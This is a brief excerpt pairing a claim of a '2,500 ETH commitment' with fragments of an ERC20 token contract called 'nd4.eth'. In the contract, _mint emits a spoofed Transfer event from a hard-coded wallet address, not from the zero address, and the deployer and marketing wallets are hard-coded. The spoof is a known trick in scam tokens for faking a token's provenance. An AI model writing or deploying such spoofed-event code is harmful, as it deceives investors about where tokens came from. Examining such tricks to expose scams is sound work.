...
11 days ago I made a 2,500 ETH committment toward the longevity of our network.
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        emit Transfer(address(0xEfbBc3fa829aF506Bc7AfE1a0C31B3c7419456F7), account, amount);
    }
...
contract nd4 is ERC20, Ownable {
    ...
    constructor() ERC20("nd4.eth", "nd4.eth") {
        ...
        deployerAddress = address(0x855E3523c2Ff4Cc47327f14346DB77D3C7ecC093); 
    	marketingWallet = address(0x855E3523c2Ff4Cc47327f14346DB77D3C7ecC093); 
